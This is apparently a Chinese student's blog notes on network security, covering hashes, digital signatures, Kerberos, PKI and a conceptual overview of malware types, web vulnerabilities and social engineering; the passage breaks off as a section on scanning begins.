        <content type="html"><![CDATA[<h2 id="四-数字签名与认证技术"><a href="#四-数字签名与认证技术" class="headerlink" title="四.数字签名与认证技术"></a>四.数字签名与认证技术</h2><h3 id="消息摘要算法："><a href="#消息摘要算法：" class="headerlink" title="消息摘要算法："></a>消息摘要算法：</h3><p>消息摘要是保证明文无法篡改、完整性的一种算法，消息摘要不是加密明文，也不是加密算法</p><ul><li>无论输入的消息有多长，计算出来的消息摘要的长度总是固定的。</li><li>消息摘要看起来是“随机的”。</li><li>一般地，只要输入的消息不同，对其进行摘要以后产生的摘要消息也必不相同</li><li>消息摘要函数是无陷门的单向函数，即只能进行正向的消息摘要而无法从摘要中恢复出任何的消息</li><li>好的摘要算法，没有人能从中找到“碰撞”，虽然“碰撞”是肯定存在的。</li></ul><h4 id="Hash函数："><a href="#Hash函数：" class="headerlink" title="Hash函数："></a>Hash函数：</h4><h5 id="Hash函数特点："><a href="#Hash函数特点：" class="headerlink" title="Hash函数特点："></a>Hash函数特点：</h5><p>（令h表示哈希函数，h满足以下条件）</p><p> 输入可以是任意长度的消息或文件<em>M</em>；</p><p> 输出长度是固定的；</p><p> 给定<em>h</em>和<em>M</em>，计算<em>h</em>(<em>M</em>)是容易的；</p><p> 给定<em>h</em>的描述，找两个不同的消息<em>M</em>1和<em>M</em>2，使得<em>h</em>(<em>M1</em>)<em>&#x3D;h</em>(M2)在计算上是不可行的。 </p><p><strong>Hash函数的安全性</strong>：在现有的计算资源下，找到一个碰撞是不可能的。</p><p>Hash函数在网络安全应用中，<strong>不仅能用于保护消息或文件的完整性，而且也能用作密码信息的安全存储。</strong></p><p>主要Hash算法有MD2、MD4、<strong>MD5、SHA。</strong></p><p>其中，MD5能产生128比特长度的哈希值，它的使用广泛，常用于网络中文件的完整性检查。而SHA在美国政府中使用，作为安全哈希标准，SHA产生的哈希值比MD5长，有160比特。 </p><h3 id="数字签名："><a href="#数字签名：" class="headerlink" title="数字签名："></a>数字签名：</h3><p>数字签名(Digital Signature)是手写签名的电子模拟，是通过电子信息计算处理，产生的一段特殊字符串消息，该消息具有与手写签名一样的特点，<strong>是可信的、不可伪造的、不可重用的、不可抵赖的以及不可修改的。</strong></p><p>数字签名至少应满足以下三个条件：</p><p>　　n 签名者事后不能否认自己的签名；</p><p>　　n 接收者能验证签名，而任何其他人都不能伪造签名；</p><p>　　n当双方就签名的真伪发生争执时，第三方能解决双方之间发生的争执。</p><h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><p>（1）<strong>直接方式的数字签名</strong></p><p>​  直接方式的数字签名只有通信双方参与，并假定接收一方知道发方的公钥。数字签名的形成方式可以用发方的私钥加密信息。 </p><p>  直接方式的数字签名有一公共弱点，即方案的有效性取决于发方密钥的安全性。 </p><p>（2）<strong>具有仲裁方式的数字签名</strong></p><p>​发方A对发往收方B的信息签名后，将信息及其签名先发给仲裁者C，C对信息及其签名验证完成后，再连同一个表示已通过验证的指令一起发往收方B。此时由于C的存在，A无法对自己发出的信息予以否认</p><h4 id="特点-组成："><a href="#特点-组成：" class="headerlink" title="特点&amp;组成："></a>特点&amp;组成：</h4><p>一个数字签名方案一般由签名算法和验证算法组成。<strong>签名</strong>算法的<strong>密钥是秘密的</strong>，只有<strong>签名人掌握</strong>；而<strong>验证算法则是公开的</strong>，以便他人验证。</p><p>签名与加密很相似，一般是签名者利用秘密密钥(私钥)对需签名的数据进行加密，验证方利用签名者的公开密钥(公钥)对签名数据做解密运算。<strong>签名与加密的不同之处在于，加密的目的是保护信息不被非授权用户访问，而签名的目的是让消息接收者确信信息的发送者是谁，信息是否被他人篡改。</strong></p><h4 id="数字签名基本流程："><a href="#数字签名基本流程：" class="headerlink" title="数字签名基本流程："></a>数字签名基本流程：</h4><p>（熟悉的Alice和Bob又出现了）</p><p>假设Alice需要签名<strong>发送一份电子合同文件给Bob</strong>。Alice的签名步骤如下： </p><ul><li><p>　　第一步，Alice使用Hash函数将电子合同文件生成一个消息摘要。</p></li><li><p>　　第二步，Alice使用自己的私钥，把消息摘要加密，形成一个数字签名。</p></li><li><p>　　第三步，Alice把电子合同文件和数字签名一同发送给Bob。</p><p> Bob收到Alice发送的电子合同文件及数字签名后，要<strong>验证电子合同文件是Alice所认可</strong>的，验证步骤如下：</p></li><li><p>​    第一步，Bob使用与Alice相同的Hash算法，计算出所收到电子合同文件的消息摘要。</p></li><li><p>　第二步，Bob使用Alice的公钥，解密来自Alice的加密消息摘要，恢复出Alice原来的消息摘要。</p></li><li><p>　第三步，Bob比较自己产生的消息摘要和恢复出来的消息摘要之间的异同。若两个消息摘要相同，则表明电子合同文件来自Alice。如果两个消息摘要的比较结果不一致，则表明电子合同文件已被篡改。</p></li></ul><p><img src="https://s2.loli.net/2024/11/10/Uz16xo34A2vQafu.png" alt="1.png"></p><h3 id="数字证书（数字标识）："><a href="#数字证书（数字标识）：" class="headerlink" title="数字证书（数字标识）："></a>数字证书（<strong>数字标识</strong>）：</h3><ul><li><p><strong>提供了一种在网络上身份验证的方式，是用来标志和证明网络通信双方身份的数字信息文件</strong>，与司机驾照或日常生活中的身份证相似。</p></li><li><p>由权威公正的第三方机构即CA中心签发。</p></li><li><p>以数字证书为核心的加密技术可以对网络上传输的信息进行加密和解密、数字签名和签名验证，确保网上传递信息的机密性、完整性，以及交易实体身份的真实性，签名信息的不可否认性，从而保障网络应用的安全性。</p></li><li><p>采用公钥密码体制，即利用一对互相匹配的密钥进行加密、解密。通过数字的手段保证加密过程是一个不可逆过程，即只有用私钥才能解密。</p></li><li><p><strong>使用</strong>：当发送一份保密文件时，发送方使用接收方的公钥对数据加密，而接收方则使用自己的私钥解密</p></li><li><p>数字证书能够确认以下两点：</p><p>  ①保证信息是由签名者自己签名发送的，签名者不能否认或难以否认。</p><p>  ②保证信息自签发后到收到为止未曾作过任何修改，签发的文件是真实文件。</p></li></ul><h3 id="认证及认证模型："><a href="#认证及认证模型：" class="headerlink" title="认证及认证模型："></a>认证及认证模型：</h3><p><strong>认证（Authentication）是指核实真实身份的过程，是防止主动攻击的重要技术之一。</strong>计算机只能识别用户的数字身份，所有对用户的授权也是针对用户数字身份的授权。</p><h4 id="认证的用途"><a href="#认证的用途" class="headerlink" title="认证的用途"></a>认证的用途</h4><p>主要用途有三方面：</p><p>（1）验证网络资源访问者的身份，给网络系统访问授权提供支持服务。</p><p>（2）验证网络信息的发送者和接收者的真实性，防止假冒。</p><p>（3）验证网络信息的完整性，防止篡改、重放或延迟。</p><h4 id="认证信息类型"><a href="#认证信息类型" class="headerlink" title="认证信息类型"></a>认证信息类型</h4><p>常用的鉴别信息主要有四种：</p><p>（1）所知道的<strong>秘密</strong>，如用户口令、PIN (Personal Identification Number)。</p><p>（2）所拥有的<strong>实物</strong>，一般是不可伪造的设备，如智能卡、磁卡等。</p><p>（3）<strong>生物特征信息</strong>，如指纹、声音、视网膜等。</p><p>（4）上下文信息，就是认证实体所处的<strong>环境信息</strong>、地理位置、时间等，例如IP地址等。 </p><h4 id="认证方法分类"><a href="#认证方法分类" class="headerlink" title="认证方法分类"></a>认证方法分类</h4><ol><li><h5 id="单向认证"><a href="#单向认证" class="headerlink" title="单向认证"></a><strong>单向认证</strong></h5></li></ol><p> 单向认证是指在网络服务认证过程中，服务方对客户方进行单方面的鉴别，而客户方不需要识别服务方的身份（账号密码）。</p><p><strong>认证过程：</strong></p><p>第一步，客户方向服务器发出访问请求； </p><p>第二步，服务器要求客户方输入ID；</p><p>第三步，客户方向服务器输入ID；</p><p>第四步，服务器要求客户方输入密码；</p><p>第五步，客户方向服务器输入密码；</p><p>第六步，服务器验证ID和密码，如果匹配则允许客户进入系统访问。 </p><ol start="2"><li><h5 id="双向认证"><a href="#双向认证" class="headerlink" title="双向认证"></a><strong>双向认证</strong></h5>双向认证是指在网络服务认证过程中，不仅服务方对客户方要进行鉴别，而且客户方也要鉴别服务方的身份。</li></ol><p><strong>认证过程：</strong></p><p>一到六步与单向的过程相同</p><p>第七步，客户提示服务器输入密码；</p><p>第八步，服务器按客户要求输入密码；</p><p>第九步，客户验证服务器。</p><ol start="3"><li><p><strong>三方来实现。</strong></p><p>第三方不仅负责维护认证信息，而且还负责验证双方的身份。<strong>每个用户都把自己的ID和密码发送给可信第三方，由第三方负责认证过程</strong>。此方法兼顾了安全性和密码存储的简单易行性。</p></li></ol><h4 id="认证实现技术："><a href="#认证实现技术：" class="headerlink" title="认证实现技术："></a>认证实现技术：</h4><ol><li><p>静态密码: 用户的密码是由用户自己设定的(就是我们平时那个密码)</p></li><li><p>智能卡（IC卡）：一种内置集成电路的芯片，芯片中存有与用户身份相关的数据</p></li><li><p>短信密码：手机短信形式请求包含6位随机数的动态密码（安全、普及、易收费和维护）</p></li><li><p>动态口令牌：生成动态密码的终端</p></li><li><p>USB KEY：软硬件相结合、一次一密的强双因子认证模式</p></li><li><p>数字签名：数字签名又称电子加密，可以区分真实数据与伪造、被篡改过的数据</p></li><li><p>生物识别技术：通过可测量的身体或行为等生物特征进行身份认证的一种技术</p></li></ol><p> （身体特征包括：指纹、掌型、视网膜、虹膜、人体气味、脸型、手的血管和DNA等；）</p><p> （行为特征包括：签名、语音、行走步态等）</p><ol start="8"><li><p>双因素身份认证：两种认证方法结合</p></li><li><p>身份的零知识证明：能够不传输这些信息身份进行认证的方法</p></li></ol><p>（ps: 目前部分学者将视网膜识别、虹膜识别和指纹识别等归为高级生物识别技术；将掌型识别、脸型识别、语音识别和签名识别等归为次级生物识别技术；将血管纹理识别、人体气味识别、DNA识别等归为“深奥的”生物识别技术）</p><h4 id="Kerberos技术"><a href="#Kerberos技术" class="headerlink" title="Kerberos技术"></a>Kerberos技术</h4><p>Kerberos的基本原理是<strong>利用对称密码技术</strong>，<strong>使用可信的第三方（刚刚的第三个方法）来认证</strong>服务器的用户身份，并在用户和服务器之间建立安全信道。(<strong>就是基于对称密码技术在网络上实施认证的一种服务协议，它允许一台工作站通过交换加密消息在非安全网络上与另一台工作站相互证明身份</strong>，一旦试图登录上网的用户身份得到验证，Kerberos协议就会给这两台工作站提供密钥，并通过使用密钥和加密算法为用户间的通信加密以进行安全的通信)</p><p>Kerberos系统涉及到</p><h5 id="四个基本实体："><a href="#四个基本实体：" class="headerlink" title="四个基本实体："></a><strong>四个基本实体：</strong></h5><ul><li>　　<strong>Kerberos客户机：</strong>用户用来访问服务器的设备。</li><li>　　<strong>AS</strong>(Authentication Server)：为用户分发TGT(Ticket Granting Ticket)的服务器。用户使用TGT(Ticket Granting Ticket)向TGS(Ticket Granting Server)证明自己的身份。</li><li>　　<strong>TGS</strong>(Ticket Granting Server)：为用户分发到最终目的票据的服务器，用户使用这个票据向自己要求提供服务的服务器证明自己的身份。</li><li>　　<strong>应用服务器</strong>(Application Server)：为用户提供特定服务。</li></ul><h5 id="设计基本思路："><a href="#设计基本思路：" class="headerlink" title="设计基本思路："></a><strong>设计基本思路：</strong></h5><p>①使用一个（或一组）独立的认证服务器（AS—Authentication Server），来为网络中的客户提供身份认证服务；</p><p>②**认证服务器 (AS)**，用户口令由 AS 保存在数据库中；</p><p>③AS 与每个服务器共享一个唯一的保密密钥（已被安全分发）</p><p><img src="https://s2.loli.net/2024/11/10/OqAMisdtBW9N8H3.png" alt="4.png"></p><h5 id="设计目标："><a href="#设计目标：" class="headerlink" title="设计目标："></a><strong>设计目标：</strong></h5><p>①安全性：能够有效防止攻击者假扮成另一个合法的授权用户。</p><p>②可靠性：分布式服务器体系结构，提供相互备份。</p><p>③对用户透明性</p><p>④可伸缩：能够支持大数量的客户和服务器。</p><p>在实际使用中，会遇到如下问题：</p><p>①用户希望输入口令的次数最少。</p><p>②口令以明文传送会被窃听。</p><p>对于这样的问题，Kerberos的解决办法是：</p><p> ①票据重用（ticket reusable）。</p><p> ②引入票据许可服务器（TGS - ticket-granting server）。用于向用户分发服务器的访问票据；认证服务器 AS 并不直接向客户发放访问应用服务器的票据，而是由 TGS 服务器来向客户发放。</p><h5 id="票据："><a href="#票据：" class="headerlink" title="票据："></a><strong>票据：</strong></h5><p>在Kerberos系统中，<strong>票据</strong>(Ticket)是用于安全传递用户身份所需要的信息的集合。<strong>它不仅包含该用户的身份，而且还包含其他一些相关的信息。一般来说，它主要包括客户方Principal、目的服务方Principal、客户方IP地址、时间戳(分发该Ticket的时间)、Ticket的生存期以及会话密钥等内容。</strong>通常将AS和TGS统称为KDC(Key Distribution Center)。</p><p><img src="https://s2.loli.net/2024/11/10/Ym8TpQE9Mzi5Jt1.png" alt="2.png"></p><p><img src="https://s2.loli.net/2024/11/10/TNELxgQjFmk3pl4.png" alt="3.png"></p><h5 id="工作流程："><a href="#工作流程：" class="headerlink" title="工作流程："></a>工作流程：</h5><ul><li>第一步，<strong>Kerberos客户向认证服务器AS申请票据TGT。</strong></li><li>第二步，（AS在认证数据库检查、确认Kerberos客户，并产生一个会话密钥，同时使用Kerberos客户的秘密密钥对会话密钥进行加密，然后）<strong>生成一个票据TGT，AS生成TGT后，把TGT发送给Kerberos客户</strong></li><li>第三步，（Kerberos客户收到AS 发来的TGT后，使用自己的秘密密钥进行）解密，<strong>得到会话密钥，然后利用解密的信息重新构造认证请求单，向TGS发送请求，申请访问</strong>应用服务器AP所需要的<strong>票据</strong>(Ticket)。</li><li>第四步， TGS使用其秘密密钥<strong>对TGT进行解密</strong>，同时使用TGT中的会话密钥<strong>对</strong>Kerberos客户的<strong>请求认证单信息进行解密</strong>，并将解密后的认证单信息与TGT中的信息进行<strong>比较</strong>。然后，TGS生成新的会话密钥以供Kerberos客户和应用服务器使用，并利用各自的秘密密钥加密会话密钥。<strong>最后，生成一个票据</strong>，它由Kerberos客户实体名、地址、时间戳、限制时间、会话密钥组成。<strong>TGS生成TGT完毕后，把TGT发送给Kerberos客户。</strong></li><li>第五步，Kerberos客户收到TGS的响应后，将获得与应用服务器共享的会话密钥。与此同时，Kerberos客户生成一个新的用于访问应用服务器的认证单，并用与应用服务器共享的会话密钥加密，然后与TGS发送来的票据一并传送到应用服务器。</li><li>第六步，应用服务器确认请求。</li></ul><p><strong>优缺点</strong>：</p><p>主要优点是利用相对便宜的技术提供了较好的保护水平</p><p>缺点主要体现在以下3个方面：</p><p>  ① 需要具有很高利用率的可信在线认证服务器（至少在物理上是安全的）；</p><p>  ②重放检测依赖于时间戳，这意味着需要同步和安全的时钟；</p><p>  ③ 如果认证过程中的密钥受到威胁，那么传输在使用该密钥进行认证的任何会话过程中的所有被保护的数据都将受到威胁。</p><h2 id="五-PKI-技术"><a href="#五-PKI-技术" class="headerlink" title="五.PKI 技术"></a>五.PKI 技术</h2><h3 id="基本概念和作用："><a href="#基本概念和作用：" class="headerlink" title="基本概念和作用："></a>基本概念和作用：</h3><p>所谓PKI(Pubic Key Infrastructure)即公钥基础设施，<strong>支持公钥的管理，并提供保密性、完整性、真实性以及可追究性安全服务的具有普适性的安全基础设施</strong></p><ol><li>可提供安全服务</li><li>支持公钥的管理</li><li>利用公钥和其他加密技术的结合。</li></ol><h3 id="主要研究内容及主要服务"><a href="#主要研究内容及主要服务" class="headerlink" title="主要研究内容及主要服务"></a>主要研究内容及主要服务</h3><ul><li>其在计算机和网络环境中得到了广泛应用：如可信计算机的本机认证、网上证券、网上保险；网上办公、网上税务、网上工商、网上海关、网上医院等。</li></ul><h4 id="主要研究内容："><a href="#主要研究内容：" class="headerlink" title="主要研究内容："></a>主要研究内容：</h4><ul><li><p>PKI提供公钥加密和数字签名服务的系统或平台，目的是为了<strong>管理密钥和证书</strong>。通过数字证书，PKI很好的<strong>证明了公钥属于谁</strong>。</p></li><li><p>技术的研究对象包括：数字证书，颁发数字证书的证书认证中心（CA），持有证书的证书持有者和使用证书服务的证书用户等</p></li></ul><h4 id="主要安全服务："><a href="#主要安全服务：" class="headerlink" title="主要安全服务："></a>主要安全服务：</h4><p>1.<strong>认证</strong>——向一个实体确认另一个实体确实是他自己。</p><p>2.<strong>完整性</strong>—— 向一个实体确保数据没有被有意或无意的修改。</p><p>3.<strong>机密性</strong>——向一个实体确保除了接收者，无人能读懂数据的关键部分。</p><p>4.<strong>不可否认</strong>性——通过数字签名机制来提供该服务的。</p><h3 id="pkl的基本结构"><a href="#pkl的基本结构" class="headerlink" title="pkl的基本结构"></a>pkl的基本结构</h3><p><strong>PKI体系结构一般由认证机构和各种终端实体组成</strong><br>（pkl体系建立首先应该关注用户使用证书及相关服务的全面性和便利性）</p><p>建立和设计一个PKI体系必须保证</p><h4 id="相关服务功能的实现"><a href="#相关服务功能的实现" class="headerlink" title="相关服务功能的实现"></a><strong>相关服务功能的实现</strong></h4><p>• 用户身份的可信认证<br>• 制定完整的证书管理政策<br>• 建立高可信度的认证CA中心<br>• 用户实体属性的管理<br>• 用户身份的隐私保护<br>• 证书作废列表处理<br>• 认证机构CA为用户提供证书库及CRL服务的管理</p><h4 id="组成"><a href="#组成" class="headerlink" title="组成"></a><strong>组成</strong></h4><ol><li>Pkl策略</li><li>软硬件系统</li><li>证书机构ca</li><li>注册机构ca</li><li>证书发布系统</li><li>pkl应用</li></ol><h3 id="pkl与数字证书"><a href="#pkl与数字证书" class="headerlink" title="pkl与数字证书"></a>pkl与数字证书</h3><p><strong>数字证书是PKI最基本的元素</strong>，也是承载PKI安全服务的最重要的载体。 在PKI体系中,用户就是通过使用数字证书来保障信息的传输的保密性、发送信息的不<br>可否认性、交易者身份的确定性等安全特性。 数字证书是PKI的核心元素，由权威的、可信认的、公证的第三方机构CA所签发</p><h4 id="数字证书的补充"><a href="#数字证书的补充" class="headerlink" title="数字证书的补充"></a>数字证书的补充</h4><p>用户证书具有下列形式:<br>正在载入… CA《A》&#x3D;CA{V，SN，AI，CA，UCA，A，UA，Ap，TA}<br>这里:<br>V——证书版本号。<br>SN一—证书序列号。<br>AI——用于对证书进行签名的算法的标识符。<br>UCA——CA可选的惟一标识符。<br>UA——用户A可选的唯一标识符。</p><h4 id="数字证书-密钥的生命周期"><a href="#数字证书-密钥的生命周期" class="headerlink" title="数字证书&#x2F;密钥的生命周期"></a>数字证书&#x2F;密钥的生命周期</h4><p><strong>主要三个阶段：</strong></p><ul><li>证书初始化注册阶段</li><li>颁发投入工作阶段</li><li>撤消阶段</li></ul><p><img src="https://s2.loli.net/2024/11/10/joKpP4BzebIltRJ.png" alt="5.png"></p><h4 id="认证过程"><a href="#认证过程" class="headerlink" title="认证过程"></a>认证过程</h4><ol><li>证书拆封</li></ol><p>用于验证发行者ca的公钥能否正确解开客户实体——证书中的“发行者的数字签名”【即证明该证书是否为可信任的第三方ca机构所签发】<br>2. 序列号验证<br>检查实体证书中的签名实体序列号是否与签发者证书的序列号一致，从而验证证书真伪。<br>3. 有效期验证<br>检查用户证书使用的日期是否合法，有无过期。<br>4.撤销列表查询</p><h4 id="pkl互联"><a href="#pkl互联" class="headerlink" title="pkl互联"></a>pkl互联</h4><p>pkl互通性必须建立在网络互通的基础上</p><p><strong>PKI在全球互通可以有两种实现途径:</strong><br>● 各PKI体系的根CA交叉认证。（一般实现方式）<br>● 建立一个全球性的统一根CA，为各PKI体系的根证书颁发证书。（实现较困难）</p><h4 id="交叉互联"><a href="#交叉互联" class="headerlink" title="交叉互联"></a>交叉互联</h4><p>双子树结构<br><img src="https://s2.loli.net/2024/11/10/PpduB2AaFN54J6K.jpg" alt="6.jpg"></p><h3 id="pkl应用实例"><a href="#pkl应用实例" class="headerlink" title="pkl应用实例"></a>pkl应用实例</h3><h4 id="虚拟专用网络（VPN）"><a href="#虚拟专用网络（VPN）" class="headerlink" title="虚拟专用网络（VPN）"></a>虚拟专用网络（VPN）</h4><p><strong>定义</strong><br>  <strong>架构VPN的基础：基于pkl技术的IPSec协议</strong><br>  是一种架构在公用通信基础设 施上的专用数据通信网络，利用网络层安全协议(尤其是IPSec)和建立在PKI上 的加密与签名技术来获得私有性。<br>  <strong>口令</strong><br>  用来防止未授权的个人直接访问敏感数据<br>  <strong>防火墙</strong><br>  用来防止公司以外的未授权个人访问公司内部信息</p><p>  基于PKI技术的IPSec协议现在已经成为架构VPN 的基础，它可以为路由器之 间、防火墙之间或者路由器和防火墙之间提供经过加密和认证的通信。虽然它的 实现会复杂一些，但其安全性比其他协议都完善得多。<strong>由于IPSec是IP层上的协 议，因此很容易在全世界范围内形成一种规范，具有非常好的通用性，而且IPSec本身就支持面向未来的协议——IPv6</strong>。</p><h4 id="安全电子邮件——-PKI-与S-MIME"><a href="#安全电子邮件——-PKI-与S-MIME" class="headerlink" title="安全电子邮件—— PKI 与S&#x2F;MIME"></a>安全电子邮件—— PKI 与S&#x2F;MIME</h4><p><strong>利用数字证书和私钥，用户可以对他所发的邮件进行数字签名，这样就可以获得认证、完整性和不可否认性，</strong>如果证书是由其所属公司或某一可信第三方颁发的，收到邮件的人就可以信任该邮件的来源，无论他是否认识发邮件的人；另一方面，在政策和法律允许的情况下，用加密的方法就可以保障信息的保密性。</p><p>目前发展很快的安全电子邮件协议是S&#x2F;MIME ，是允许发送加密和有签名邮件的协议。主要依赖技术是pkl。</p><h4 id="Web安全——PKI-与-SSL"><a href="#Web安全——PKI-与-SSL" class="headerlink" title="Web安全——PKI 与 SSL"></a>Web安全——PKI 与 SSL</h4><p>无论是IE还是其他浏览器，都支持SSL协议（The Secure Sockets Layer）。这是一个在传输层和应用层之间的安全通信层，在两个实体进行通信之前，先要建立SSL连接，以此实现对应用层透明的安全通信。<strong>利用PKI技术，服务器和客户端都对对方的证书进行验证，同时客户端生成会话密钥和选择消息摘要算法，利用服务器端的公钥加密会话密钥，传送给服务器，这样SSL协议就允许在浏览器和服务器之间进行加密通信。</strong>SSL利用数字证书保证通信安全，服务器端和浏览器端分别由可信的第三方颁发数字证书，这样在交易时，双方可以通过数字证书确认对方的身份。需要注意的是，SSL协议本身并不能提供对不可否认性的支持，这部分的工作必须由数字证书完成。</p><p>结合SSL协议和数字证书，PKI技术可以保证Web 交易多方面的安全需求，使Web上的交易和面对面的交易一样安全。</p><h2 id="第六章-网络攻击与防御技术"><a href="#第六章-网络攻击与防御技术" class="headerlink" title="第六章 网络攻击与防御技术"></a><strong>第六章 网络攻击与防御技术</strong></h2><h3 id="6-1-攻击技术"><a href="#6-1-攻击技术" class="headerlink" title="6.1 攻击技术"></a>6.1 攻击技术</h3><h4 id="6-1-1-计算机病毒（或称恶意代码）"><a href="#6-1-1-计算机病毒（或称恶意代码）" class="headerlink" title="6.1.1 计算机病毒（或称恶意代码）"></a>6.1.1 计算机病毒（或称恶意代码）</h4><p>•计算机病毒是一种恶意软件，可以通过感染计算机系统并在其中复制自身来破坏计算机系统、窃取信息或进行其他恶意活动。</p><p>•计算机病毒通常通过网络、移动存储设备或恶意软件等途径传播，并且可能造成广泛的破坏和损失。</p><p>计算机病毒根据其传播方式、破坏方式和功能等不同特点，可以分为以下几类主要的分类：</p><ol><li>文件感染型病毒：病毒会感染可执行文件、程序或脚本文件，一旦这些文件运行，病毒就会开始感染系统中的其他文件</li><li>引导型病毒： 感染计算机的引导扇区后，在计算机启动时加载自身到内存中，使得计算机在启动时被感染</li><li>宏病毒：这种病毒主要利用应用程序中的宏功能，感染文档和模板文件，并在用户打开这些文件时执行恶意代码。</li><li>逻辑炸弹（Logic bombs）：逻辑炸弹是一种预设条件触发的恶意代码，可能在特定条件满足时触发破坏性行为。</li><li>蠕虫（Worm）：蠕虫是一种自我复制并通过网络传播的病毒，可以迅速在网络中传播并感染大量系统。</li><li>特洛伊木马（Trojan horse）：特洛伊木马是一种伪装成正常或有用程序，但实际上含有恶意代码的病毒，常常用于窃取信息、监视用户活动等恶意行为。</li><li>Rootkit：Rootkit是植入系统内核或应用程序中的一种恶意软件，目的是隐藏自身活动，绕过系统安全控制。</li><li>勒索软件（Ransomware）：勒索软件是一种加密文件然后勒索用户赎金的恶意软件，对用户和组织造成巨大损失。</li></ol><p>（遇到了再查解释。。）</p><p>计算机病毒发展趋势：</p><ol><li><p>AI和机器学习：恶意软件作者开始利用人工智能和机器学习技术来创建更具破坏性和隐匿性的病毒。这些病毒可能能够自我学习和适应防御系统的智能对抗。</p></li><li><p>指向性攻击：针对特定目标的高度定制化攻击越来越常见，这种攻击可能采用高级持续性威胁（Advanced Persistent Threat，APT）的形式，目的是窃取高价值信息或进行网络间谍活动。</p></li><li><p>IoT和移动设备攻击：随着物联网设备和移动设备的普及，计算机病毒也开始针对这些设备进行攻击，利用它们的弱点来入侵和控制目标系统。</p></li><li><p>加密货币挖矿病毒：近年来，加密货币挖矿病毒成为较为普遍的一种类型，这种病毒会利用感染的计算机资源来挖掘加密货币，占用系统性能和资源。</p></li><li><p>社交工程和钓鱼攻击：计算机病毒作者通过社交工程手段，如伪装成合法的电子邮件或网站，诱导用户点击链接或下载附件，从而传播恶意软件。</p></li></ol><p><strong>网络攻击</strong>一般采用三种技术手段，</p><ul><li><strong>一是利用计算机病毒（或称恶意代码）；</strong></li><li><strong>二是利用系统或者程序中的漏洞，或者协议漏洞；</strong></li><li><strong>三是利用社会工程学。</strong></li></ul><h4 id="6-1-2-漏洞的基本概念"><a href="#6-1-2-漏洞的基本概念" class="headerlink" title="6.1.2 漏洞的基本概念"></a>6.1.2 漏洞的基本概念</h4><p>•漏洞（Vulnerability）是指<strong>计算机系统或软件中存在的未被发现或未被修复的安全弱点</strong>，可以被黑客或恶意用户利用来进行攻击或入侵。漏洞可能导致系统崩溃、数据泄露、远程执行命令等安全问题，对系统和用户的信息安全构成威胁。许多安全漏洞是程序错误导致的，此时可叫做安全缺陷（Security bug），但并不是所有的安全隐患都是程序安全缺陷导致的。</p><p><strong>系统漏洞</strong></p><p>系统漏洞中目前最常见的是Web漏洞，它通常是指网络系统程序上的漏洞，可能是由于代码编写者在编写代码时考虑不周全等原因而造成的漏洞，<strong>常见的Web漏洞有Sql注入、XSS漏洞、上传漏洞等</strong>，具体分类如下：</p><p>•1. XSS（Cross-Site Scripting）跨站脚本，因为缩写和CSS重叠，所以只能叫XSS。跨站脚本是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种。</p><p>•2. SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数代入数据库查询，攻击者可以通过在不同的SQL语句来实现对数据库的任意操作。</p><p>•3. CSRF（Cross-Site Request Forgery）为跨站请求伪造，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。CSRF通过伪装成受信任用户请求受信任的网站。CSRF难以防范，危险性比XSS更高。</p><p>•4. SSRF（Server-Side Request Forgery）为服务器端请求伪造，是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统。</p><p>•5. 文件上传漏洞是在上传文件时，如果服务器代码未对客户端上传的文件进行严格的验证和过滤，很容易造成可以上传任意文件的情况，包括上传脚本文件（asp、aspx、php、jsp等格式的文件）。非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被成为WebShell，也可将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</p><p>•6. 命令执行应用程序有时需要调用一些执行系统命令的函数，如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令。当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p><p>•7. 逻辑漏洞就是指攻击者利用业务的设计缺陷，获取敏感信息或破坏业务的完整性。一般出现在密码修改、越权访问、密码找回、交易支付金额等功能处。其中越权访问又分为水平越权和垂直越权。</p><h4 id="6-1-3-社会工程学"><a href="#6-1-3-社会工程学" class="headerlink" title="6.1.3 社会工程学"></a>6.1.3 社会工程学</h4><p><strong>社会工程学（攻击）是指在信息安全方面操纵人的心理，使其采取行动或泄露机密信息。有别于社会科学中的社会工程，这是种以收集信息、欺诈或入侵系统为目的的信任骗局，已发展出各种技术手段，并可能用于犯罪。</strong></p><p>各类型的网络犯罪和信息安全威胁，都会用社会工程学学的技巧，尤其是在<strong>目标式攻击</strong>中使用的频率愈来愈高。网络罪犯以往只会用世界杯足球赛或情人节等标题耸动的全球事件或新闻来引诱用户，现在有其他的犯罪手法往往也搭配使用社会工程学学技巧。</p><p>•钓鱼攻击：是一种企图从电子通信中，伪装成信誉卓著的法人媒体以获得用户名、密码和信用卡信息等敏感个人资料的犯罪诈骗过程。大多数的钓鱼攻击都是伪装成银行、学校、软件公司或政府安全机构等可信服务提供者，例如FBI。</p><p>•诱饵计划：在此类型的社会工程学阴谋中，攻击者利用了人们对于例如最新电影或者热门MV的超高关注，从而对这些人进行信息挖掘。这在例如Bit torrent等P2P分享网络中很常见。</p><p>•垃圾邮件：以电子邮件包装着恶意木马程序的电子邮件入侵受害者电脑，例如主旨为美国总统大选结果的电子邮件附件却包含恶意木马程序。</p><p>•电脑蠕虫：不需附在别的程序内，用户不介入操作的情况下也能自我复制或执行。</p><p>•恶意软件。</p><h3 id="6-2-信息收集"><a href="#6-2-信息收集" class="headerlink" title="6.2 信息收集"></a>6.2 信息收集</h3><h4 id="6-2-1-扫描技术"><a href="#6-2-1-扫描技术" class="headerlink" title="6.2.1 扫描技术"></a>6.2.1 扫描技术</h4><p><strong>扫描的目的</strong></p><p>主要有三个:</p><ul><li>查看目标网络中哪些主机是存活的</li><li>查看存活的主机运行了哪些服务</li><li>查看主机提供的服务有无漏洞</li></ul><h5 id="扫描的主要分类："><a href="#扫描的主要分类：" class="headerlink" title="扫描的主要分类："></a><strong>扫描的主要分类：</strong></h5><ul><li><h6 id="IP扫描"><a href="#IP扫描" class="headerlink" 